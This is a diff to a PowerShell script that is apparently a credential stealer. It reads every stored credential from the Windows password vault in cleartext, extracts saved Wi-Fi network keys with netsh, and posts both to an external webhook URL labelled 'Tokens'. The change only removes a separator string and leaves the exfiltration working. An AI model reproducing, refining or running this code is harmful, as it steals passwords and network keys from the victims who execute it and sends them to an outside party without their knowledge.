@@ -5,10 +5,9 @@ $vault = New-Object Windows.Security.Credentials.PasswordVault
 $cachedPasswords = $vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | Format-Table -HideTableHeaders | Out-String
 
 $wifiData = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String 
-$safety = "O_O"
 $Body = @{
   'username' = 'Tokens: '
-  'content' = $wifiData + $safety + $cachedPasswords + $safety
+  'content' = $wifiData + $cachedPasswords
 }
 Invoke-RestMethod -Uri $hookUrl -Method 'post' -Body $Body
 
